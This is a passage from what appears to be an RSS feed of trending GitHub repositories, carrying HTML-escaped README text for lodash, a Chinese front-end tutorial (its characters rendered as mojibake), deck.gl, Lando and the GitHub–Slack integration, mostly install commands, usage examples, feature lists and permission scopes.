&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;script src=&quot;lodash.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Using npm:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ npm i -g npm
$ npm i lodash
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Note: add &lt;code&gt;--save&lt;/code&gt; if you are using npm &amp;lt; 5.0.0&lt;/p&gt; 
&lt;p&gt;In Node.js:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// Load the full build.
var _ = require(&#39;lodash&#39;);
// Load the core build.
var _ = require(&#39;lodash/core&#39;);
// Load the FP build for immutable auto-curried iteratee-first data-last methods.
var fp = require(&#39;lodash/fp&#39;);

// Load method categories.
var array = require(&#39;lodash/array&#39;);
var object = require(&#39;lodash/fp/object&#39;);

// Cherry-pick methods for smaller browserify/rollup/webpack bundles.
var at = require(&#39;lodash/at&#39;);
var curryN = require(&#39;lodash/fp/curryN&#39;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Looking for Lodash modules written in ES6 or smaller bundle sizes? Check out &lt;a href=&quot;https://www.npmjs.com/package/lodash-es&quot;&gt;lodash-es&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Why Lodash?&lt;/h2&gt; 
&lt;p&gt;Lodash makes JavaScript easier by taking the hassle out of working with arrays,
 &lt;!-- raw HTML omitted --&gt; numbers, objects, strings, etc. Lodash‚Äôs modular methods are great for:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Iterating arrays, objects, &amp;amp; strings&lt;/li&gt; 
 &lt;li&gt;Manipulating &amp;amp; testing values&lt;/li&gt; 
 &lt;li&gt;Creating composite functions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Module Formats&lt;/h2&gt; 
&lt;p&gt;Lodash is available in a &lt;a href=&quot;https://lodash.com/custom-builds&quot;&gt;variety of builds&lt;/a&gt; &amp;amp; module formats.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.npmjs.com/package/lodash&quot;&gt;lodash&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://www.npmjs.com/search?q=keywords:lodash-modularized&quot;&gt;per method packages&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.npmjs.com/package/lodash-es&quot;&gt;lodash-es&lt;/a&gt;, &lt;a href=&quot;https://www.npmjs.com/package/babel-plugin-lodash&quot;&gt;babel-plugin-lodash&lt;/a&gt;, &amp;amp; &lt;a href=&quot;https://www.npmjs.com/package/lodash-webpack-plugin&quot;&gt;lodash-webpack-plugin&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/lodash/lodash/tree/npm/fp&quot;&gt;lodash/fp&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.npmjs.com/package/lodash-amd&quot;&gt;lodash-amd&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>qianguyihao/Web</title>
      <link>https://github.com/qianguyihao/Web</link>
      <description>&lt;p&gt;ÂâçÁ´ØÂÖ•Èó®Âà∞ËøõÈò∂ÂõæÊñáÊïôÁ®ãÔºåË∂ÖËØ¶ÁªÜÁöÑWebÂâçÁ´ØÂ≠¶‰π†Á¨îËÆ∞„ÄÇ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ÂâçÁ´ØÔºåÂÅö‰∏ÄÂêçÁ≤æËá¥‰ºòÈõÖÁöÑÂâçÁ´ØÂ∑•Á®ãÂ∏à„ÄÇÂÖ¨‰ºóÂè∑„ÄåÂçÉÂè§Â£πÂè∑„Äç‰ΩúËÄÖ„ÄÇ&lt;/p&gt;&lt;hr&gt;&lt;p&gt;ÂâçÁ´ØÂÖ•Èó®Âà∞ËøõÈò∂ÂõæÊñáÊïôÁ®ãÔºåË∂ÖËØ¶ÁªÜÁöÑ Web ÂâçÁ´ØÂ≠¶‰π†Á¨îËÆ∞„ÄÇ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ÂâçÁ´ØÔºåÂÅö‰∏ÄÂêçÁ≤æËá¥‰ºòÈõÖÁöÑÂâçÁ´ØÂ∑•Á®ãÂ∏à„ÄÇ&lt;/p&gt; 
&lt;h2&gt;È°πÁõÆÂú∞ÂùÄ&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;GitHubÂú∞ÂùÄÔºàÊúÄÂÆåÊï¥ÔºâÔºö&lt;a href=&quot;https://github.com/qianguyihao/Web&quot;&gt;https://github.com/qianguyihao/Web&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Â¶ÇÊûú‰Ω†ÂèëÁé∞Êú¨È°πÁõÆÊúâÂÜÖÂÆπ‰∏äÁöÑÈîôËØØÔºåÊ¨¢ËøéÂú® GitHub Êèê‰∫§ issues ËøõË°åÊåáÊ≠£Ôºå&lt;strong&gt;Êñπ‰æøÂΩíÊ°£&lt;/strong&gt;„ÄÇÂ¶ÇÊûú‰Ω†ÁöÑÁΩëÁªúËæÉÊÖ¢Ôºå‰πüÂèØ‰ª•Âú®ËØ≠ÈõÄ‰∏äÁïôË®Ä„ÄÇ&lt;/p&gt; 
&lt;p&gt;Áî±‰∫é GitHub ÊòØÂõΩÂ§ñÁöÑÁΩëÁ´ôÔºåÂ¶ÇÊûú‰Ω†ÂèëÁé∞ÁΩëÁ´ôËÆøÈóÆËæÉÊÖ¢ÔºåÊàñËÄÖÊñá‰∏≠ÁöÑÈÉ®ÂàÜÂõæÁâáÂä†ËΩΩ‰∏çÂá∫Êù•Ôºå‰∏çÂ¶®&lt;a href=&quot;https://github.com/qianguyihao/Web/issues/20#issue-390074432&quot;&gt;ÂÖàÁúãËøôÈáå&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;h2&gt;È°πÁõÆ‰ªãÁªç&lt;/h2&gt; 
&lt;p&gt;ÂâçÁ´ØÂÖ•Èó®Âà∞ËøõÈò∂ÂõæÊñáÊïôÁ®ã„ÄÇ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ÂâçÁ´ØÔºåÂÅö‰∏ÄÂêçÁ≤æËá¥ÁöÑÂâçÁ´ØÂ∑•Á®ãÂ∏à„ÄÇÊåÅÁª≠Êõ¥Êñ∞‰∏≠„ÄÇÊú¨È°πÁõÆÁöÑ‰∏ªË¶Å‰ΩúÁî®ÊúâÔºö&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;1„ÄÅÁΩë‰∏äÁöÑÂ§ßÈÉ®ÂàÜÂÖ•Èó®ÊïôÁ®ãÔºåÈÉΩ‰∏çÂ§™ÈÄÇÂêàÂàùÂ≠¶ËÄÖÔºåÊú¨È°πÁõÆ‰∫âÂèñÁÖßÈ°æÂà∞ÊØè‰∏Ä‰ΩçÂâçÁ´ØÂÖ•Èó®ËÄÖÁöÑÂêåÁêÜÂøÉ„ÄÇÂç≥‰Ωø‰Ω†ÂÆåÂÖ®‰∏çÊáÇÂâçÁ´ØÔºåÁîöËá≥‰∏çÊáÇÁºñÁ®ãÔºåÈÄöËøáËøô‰∏™ÊïôÁ®ãÔºå‰πüËÉΩËÆ©Â∞èÁôΩÂÖ•Èó®„ÄÇ&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;2„ÄÅÂ∏ÆÂä©ÂâçÁ´ØÂêåÂ≠¶Êèê‰æõ‰∏Ä‰∏™Á≤æÂìÅÂ≠¶‰π†ËµÑÊ∫êÂíåË∑ØÁ∫øÔºåÊèêÈ´òÂ≠¶‰π†ÊïàÁéáÔºåÂ∞ëËµ∞ÂæàÂ§öÂºØË∑Ø„ÄÇ&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;3„ÄÅÂèØ‰ª•ÂΩìÂÅöÂâçÁ´ØÂ≠óÂÖ∏ÔºåÈöèÊó∂ÁøªÈòÖÔºåÊü•ÊºèË°•Áº∫„ÄÇ&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Áª¥Êä§Ëøô‰∏™È°πÁõÆÁöÑÂàùË°∑ÔºåÂèØ‰ª•ÁúãËøôÁØáÊñáÁ´†Ôºö&lt;a href=&quot;https://mp.weixin.qq.com/s/fr_NwtghRQagc_3ubk-hKQ&quot;&gt;„ÄäË£∏Ëæû‰∏§‰∏™ÊúàÔºåÊµ∑Êäï‰∏Ä‰∏™ÊúàÔºå‰ªéAndroidËΩ¨ÊàòWebÂâçÁ´ØÁöÑÊ±ÇËÅå‰πãË∑Ø„Äã&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;ÂâçÁ´ØÂÖ•Èó®Ë∑ØÁ∫øÂíåÊé®ËçêÂ≠¶‰π†ËµÑÊ∫êÔºåÂèØ‰ª•ÁúãËøôÁØáÊñáÁ´†Ôºö&lt;a href=&quot;https://www.cnblogs.com/qianguyihao/p/8776837.html&quot;&gt;„Ää2020Âπ¥WebÂâçÁ´ØÂÖ•Èó®ÁöÑËá™Â≠¶Ë∑ØÁ∫ø„Äã&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;LICENSE&lt;/h2&gt; 
&lt;p&gt;&lt;img src=&quot;http://img.smyhvae.com/20210331_CC-BY-NC-SA.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt; 
&lt;p&gt;Êú¨‰ΩúÂìÅÈááÁî®&lt;a href=&quot;https://creativecommons.org/licenses/by-nc-sa/4.0/&quot;&gt;Áü•ËØÜÂÖ±‰∫´ÁΩ≤Âêç-ÈùûÂïÜ‰∏öÊÄß‰ΩøÁî®-Áõ∏ÂêåÊñπÂºèÂÖ±‰∫´ 4.0 ÂõΩÈôÖËÆ∏ÂèØÂçèËÆÆ&lt;/a&gt;ËøõË°åËÆ∏ÂèØ„ÄÇ&lt;/p&gt; 
&lt;h2&gt;Â≠¶‰π†‰∫§ÊµÅ&lt;/h2&gt; 
&lt;p&gt;ÊàëÂª∫‰∫Ü‰∏Ä‰∏™‚ÄúÂâçÁ´ØÂ≠¶‰π†‚ÄùÁöÑÂæÆ‰ø°‰∫§ÊµÅÁæ§ÔºåÂú®‰∏ãÊñπÂÖ¨‰ºóÂè∑ÈáåÂõûÂ§ç„ÄåÂâçÁ´ØÂ≠¶‰π†„ÄçÔºåÊãâ‰Ω†ËøõÁæ§Ôºö&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;ËøõÁæ§ÊöóÂè∑ÔºöÂâçÁ´ØÂ≠¶‰π†„ÄÇ&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Áæ§ÈáåÂè™ÂÅö‰∏§‰ª∂‰∫ãÔºöÂ≠¶‰π†ÂíåÂàÜ‰∫´„ÄÇ&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;img src=&quot;http://img.smyhvae.com/20210329_1930.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>visgl/deck.gl</title>
      <link>https://github.com/visgl/deck.gl</link>
      <description>&lt;p&gt;WebGL2 powered geospatial visualization layers&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&quot;https://visgl.github.io/deck.gl&quot;&gt;&lt;img src=&quot;http://i.imgur.com/mvfvgf0.jpg&quot; alt=&quot;docs&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;deck.gl is designed to simplify high-performance, WebGL-based visualization of large data sets. Users can quickly get impressive visual results with minimal effort by composing existing layers, or leverage deck.gl&#39;s extensible architecture to address custom needs.&lt;/p&gt; 
&lt;p&gt;deck.gl maps &lt;strong&gt;data&lt;/strong&gt; (usually an array of JSON objects) into a stack of visual &lt;strong&gt;layers&lt;/strong&gt; - e.g. icons, polygons, texts; and look at them with &lt;strong&gt;views&lt;/strong&gt;: e.g. map, first-person, orthographic.&lt;/p&gt; 
&lt;p&gt;deck.gl handles a number of challenges out of the box:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Performant rendering and updating of large data sets&lt;/li&gt; 
 &lt;li&gt;Interactive event handling such as picking, highlighting and filtering&lt;/li&gt; 
 &lt;li&gt;Cartographic projections and integration with major basemap providers&lt;/li&gt; 
 &lt;li&gt;A catalog of proven, well-tested layers&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Deck.gl is designed to be highly customizable. All layers come with flexible APIs to allow programmatic control of each aspect of the rendering. All core classes such are easily extendable by the users to address custom use cases.&lt;/p&gt; 
&lt;h2&gt;Flavors&lt;/h2&gt; 
&lt;h3&gt;Script Tag&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;script src=&quot;https://unpkg.com/deck.gl@latest/dist.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/visgl/deck.gl/master/docs/get-started/using-standalone.md#using-the-scripting-api&quot;&gt;Get started&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/visgl/deck.gl/tree/master/examples/get-started/scripting&quot;&gt;Full examples&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;NPM Module&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install deck.gl
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Pure JS&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/visgl/deck.gl/master/docs/get-started/using-standalone.md&quot;&gt;Get started&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/visgl/deck.gl/master/examples/get-started/pure-js&quot;&gt;Full examples&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;React&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/visgl/deck.gl/master/docs/get-started/using-with-react.md&quot;&gt;Get started&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/visgl/deck.gl/master/examples/get-started/react&quot;&gt;Full examples&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Python&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pip install pydeck
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://pydeck.gl/installation.html&quot;&gt;Get started&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://pydeck.gl/&quot;&gt;Examples&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Third-Party Bindings&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/danmarshall/deckgl-typings&quot;&gt;deckgl-typings&lt;/a&gt; (Typescript)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://symbolixau.github.io/mapdeck/articles/mapdeck.html&quot;&gt;mapdeck&lt;/a&gt; (R)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/microsoft/SandDance/tree/master/packages/vega-deck.gl&quot;&gt;vega-deck.gl&lt;/a&gt; (&lt;a href=&quot;https://vega.github.io/&quot;&gt;Vega&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://earthengine-layers.com/&quot;&gt;earthengine-layers&lt;/a&gt; (&lt;a href=&quot;https://earthengine.google.com/&quot;&gt;Google Earth Engine&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/UnfoldedInc/deck.gl-native&quot;&gt;deck.gl-native&lt;/a&gt; (C++)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Learning Resources&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://deck.gl/#/documentation&quot;&gt;API documentation&lt;/a&gt; for the latest release&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://deck.gl/#/examples&quot;&gt;Website demos&lt;/a&gt; with links to source&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://deck.gl/playground&quot;&gt;Interactive playground&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://codepen.io/vis-gl/&quot;&gt;deck.gl Codepen demos&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://beta.observablehq.com/@pessimistress&quot;&gt;deck.gl Observable demos&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://medium.com/vis-gl&quot;&gt;vis.gl Medium blog&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://join.slack.com/t/deckgl/shared_invite/zt-7oeoqie8-NQqzSp5SLTFMDeNSPxi7eg&quot;&gt;deck.gl Slack workspace&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;deck.gl is part of vis.gl, a &lt;a href=&quot;https://uc.foundation/&quot;&gt;Urban Computing Foundation&lt;/a&gt; project. Read the &lt;a href=&quot;https://raw.githubusercontent.com/visgl/deck.gl/master/CONTRIBUTING.md&quot;&gt;contribution guidelines&lt;/a&gt; if you are intrested in contributing.&lt;/p&gt; 
&lt;h2&gt;Attributions&lt;/h2&gt; 
&lt;h4&gt;Data sources&lt;/h4&gt; 
&lt;p&gt;Data sources are listed in each example.&lt;/p&gt; 
&lt;h4&gt;The deck.gl project is supported by&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt;</description>
    </item>
    
    <item>
      <title>lando/lando</title>
      <link>https://github.com/lando/lando</link>
      <description>&lt;p&gt;A development tool for all your projects that is fast, easy, powerful and liberating&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Security Issues&lt;/h2&gt; 
&lt;p&gt;If you have discovered a security issue with Lando, please contact the Lando Security Team directly at &lt;a href=&quot;mailto:security@devwithlando.io&quot;&gt;security@devwithlando.io&lt;/a&gt;. We manage security issues separately in a private repository until the issue has been resolved. Even if you&#39;re not sure if it&#39;s a security problem, please contact the security team before filing an issue, blogging, or tweeting about it.&lt;/p&gt; 
&lt;h2&gt;Other Resources&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=tkBVDh7my9Q&quot;&gt;Mountain climbing advice&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>integrations/slack</title>
      <link>https://github.com/integrations/slack</link>
      <description>&lt;p&gt;Bring your code to the conversations you care about with the GitHub and Slack integration&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;GitHub + Slack Integration&lt;/h1&gt; 
&lt;p&gt;| Build | Code Coverage | Dependencies | |-------|---------------|--------------| | &lt;a href=&quot;https://travis-ci.org/integrations/slack&quot;&gt;&lt;img src=&quot;https://travis-ci.org/integrations/slack.svg?branch=master&quot; alt=&quot;Build Status&quot;&gt;&lt;/a&gt; | &lt;a href=&quot;https://codecov.io/gh/integrations/slack&quot;&gt;&lt;img src=&quot;https://codecov.io/gh/integrations/slack/branch/master/graph/badge.svg?token=wGV2kENgLx&quot; alt=&quot;codecov&quot;&gt;&lt;/a&gt; | &lt;a href=&quot;https://greenkeeper.io/&quot;&gt;&lt;img src=&quot;https://badges.greenkeeper.io/integrations/slack.svg&quot; alt=&quot;Greenkeeper badge&quot;&gt;&lt;/a&gt; |&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Heads Up!&lt;/strong&gt; The GitHub and Slack app has a few new features to help you turn conversations into next steps. Take action on pull requests, issues, and more right from your Slack channels to start moving work forward, faster. &lt;a href=&quot;https://blog.github.com/2018-05-17-new-improvements-to-slack-and-github-integration/&quot;&gt;Read more about it on the GitHub blog&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;About&lt;/h2&gt; 
&lt;p&gt;The GitHub integration for Slack gives you and your teams full visibility into your GitHub projects right in Slack channels, where you can generate ideas, triage issues and collaborate with other teams to move projects forward. This integration is an open source project, built and maintained by GitHub.&lt;/p&gt; 
&lt;h2&gt;Table of Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#installing-the-github-integration-for-slack&quot;&gt;Installing the GitHub integration for Slack&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#requirements&quot;&gt;Requirements&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#installation&quot;&gt;Installation&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#authorization&quot;&gt;Authorization&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Getting Started 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#repository-activity&quot;&gt;Repository Activity&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#link-previews&quot;&gt;Link previews&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#take-action&quot;&gt;Take action&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#configuration&quot;&gt;Configuration&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#moving-away-from-the-legacy-workspace-app-model-in-slack&quot;&gt;Moving away from the legacy workspace app model in Slack&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#questions-need-help&quot;&gt;Need help?&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#contributing&quot;&gt;Contributing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/#license&quot;&gt;License&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr&gt; 
&lt;h2&gt;Installing the GitHub integration for Slack&lt;/h2&gt; 
&lt;h3&gt;Requirements&lt;/h3&gt; 
&lt;p&gt;This app officially supports GitHub.com (which includes our GitHub Enterprise cloud-hosted offering) and Slack.com, but the team plans to support GitHub Enterprise Server (our self-hosted product) and Slack Enterprise Grid in the future.&lt;/p&gt; 
&lt;h3&gt;Installation&lt;/h3&gt; 
&lt;p&gt;&lt;a href=&quot;https://slack.com/apps/A8GBNUWU8-github&quot;&gt;Install the GitHub integration for Slack&lt;/a&gt;. After you&#39;ve signed in to your Slack workspace, you will be prompted to give the app access:&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;After the app is installed, and once you&#39;ve added the GitHub integration to the relevant channels using &lt;code&gt;/invite @github&lt;/code&gt;, you will see previews of links to GitHub issues, pull-requests, and code rendered as rich text in your workspace.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h3&gt;Subscribing and Unsubscribing&lt;/h3&gt; 
&lt;p&gt;At this point, your Slack and GitHub user accounts are not linked. To link the two accounts, authenticate to GitHub using a &lt;code&gt;/github&lt;/code&gt; slash command, &lt;code&gt;/github signin&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;/github&lt;/code&gt; slash command also accepts a &lt;code&gt;subscribe&lt;/code&gt; argument that you can use to subscribe to an Organization or Repository&#39;s activity &lt;code&gt;/github subscribe &amp;lt;organization&amp;gt;/&amp;lt;repository&amp;gt;&lt;/code&gt;.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;If you originally gave the app access to &quot;All repositories&quot; and you&#39;ve created a new private repository on GitHub after installing the GitHub integration for Slack, the &lt;code&gt;/github subscribe&lt;/code&gt; command will work automatically on your new repository. If you installed the app on a subset of repositories, the app will prompt you to install it on the new repository.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;/github&lt;/code&gt; slash command also supports &lt;code&gt;unsubscribe&lt;/code&gt;. To unsubscribe to notifications from a repository, use &lt;code&gt;/github unsubscribe &amp;lt;organization&amp;gt;/&amp;lt;repository&amp;gt;&lt;/code&gt;&lt;/p&gt; 
&lt;h3&gt;Authorization&lt;/h3&gt; 
&lt;p&gt;By granting the app access, you are providing the following authorizations to your GitHub and Slack accounts:&lt;/p&gt; 
&lt;h4&gt;Slack Permission Scopes&lt;/h4&gt; 
&lt;p&gt;|Permission scope|Why we need it| |---|---| |Access private conversations between you and the App | To message you with instructions. | |View links to GitHub.com in messages| To render rich links from &lt;code&gt;github.com&lt;/code&gt;| |Add link previews to GitHub.com to messages| To render rich links to &lt;code&gt;github.com&lt;/code&gt;| |Add slash commands| To add the &lt;code&gt;/github&lt;/code&gt; slash command to your Slack workspace | |View the workspace or organization&#39;s name, email domain, and icon| To store subscriptions you set up| |Post messages as the app| To notify you of activity that happens on GitHub, in Slack|&lt;/p&gt; 
&lt;h4&gt;GitHub Permission Scopes&lt;/h4&gt; 
&lt;p&gt;|Permission scope|Why we need it| |---|---| |Read access to code| To render code snippets in Slack| |Read access to commit statuses, checks, issues, metadata, pull requests, and repository projects | To render previews of links shared in Slack| |Write access to issues, deployments, and pull requests | To take action from Slack with the &lt;code&gt;/github&lt;/code&gt; command and directly from messages|&lt;/p&gt; 
&lt;h4&gt;Repository Activity&lt;/h4&gt; 
&lt;p&gt;&lt;strong&gt;Subscribe to an Organization or a Repository&lt;/strong&gt; On repositories, the app notifies of &lt;code&gt;open&lt;/code&gt;, &lt;code&gt;close&lt;/code&gt;, and &lt;code&gt;re-open&lt;/code&gt; events on pull requests and issues in repositories you&#39;ve subscribed to. It also notifies of any &lt;code&gt;push&lt;/code&gt; directly to the repository&#39;s default branch as well as &lt;code&gt;comments&lt;/code&gt; on issues and pull requests.&lt;/p&gt; 
&lt;h4&gt;Link previews&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;p&gt;When a user posts a GitHub link to &lt;strong&gt;issues and pull requests&lt;/strong&gt;, directly linked &lt;strong&gt;comments&lt;/strong&gt;, code &lt;strong&gt;blobs&lt;/strong&gt; with line numbers, as well as &lt;strong&gt;organizations, repositories, and users&lt;/strong&gt; in Slack, a preview of the link will be shown.&lt;/p&gt; 
&lt;p&gt;Previews of links will not be shown if:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;link previews for &lt;code&gt;github.com&lt;/code&gt; have been &lt;a href=&quot;https://get.slack.help/hc/en-us/articles/204399343-Share-links-in-Slack#turn-off-link-previews-for-specific-sites&quot;&gt;disabled for your workspace&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;the same link was already shared in the last 30 minutes in the same channel&lt;/li&gt; 
 &lt;li&gt;3 or more links are shared in the same chat message&lt;/li&gt; 
 &lt;li&gt;The repository is private and the user that shared the link: 
  &lt;ul&gt; 
   &lt;li&gt;has not signed in to their GitHub account&lt;/li&gt; 
   &lt;li&gt;asked not to show a preview when prompted&lt;/li&gt; 
   &lt;li&gt;the GitHub app is not in the channel, which you can remedy with &lt;code&gt;/invite @github&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Take action&lt;/h4&gt; 
&lt;p&gt;Slack conversations often lead to decisions and actionable takeaways. Now it‚Äôs easier to start on next steps from Slack with slash commands for common GitHub actions, using &lt;code&gt;/github [action] [resource]&lt;/code&gt;. These commands let you:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Close an issue or pull request with &lt;code&gt;/github close [issue link]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Reopen an issue or pull request with &lt;code&gt;/github open [pull request link]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Open a new issue with &lt;code&gt;/github open [owner/repo]&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;You can also take action on GitHub directly from a Slack message by clicking on the &#39;&lt;code&gt;...&lt;/code&gt; More Actions&#39; menu available on every Slack message. From there you can:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Attach a message as a comment to an existing issue or pull request 
  &lt;ul&gt; 
   &lt;li&gt;Select an issue by choosing from an automatically loaded list of recently active issues and pull requests that involve you or by entering a URL to an issue or pull request&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
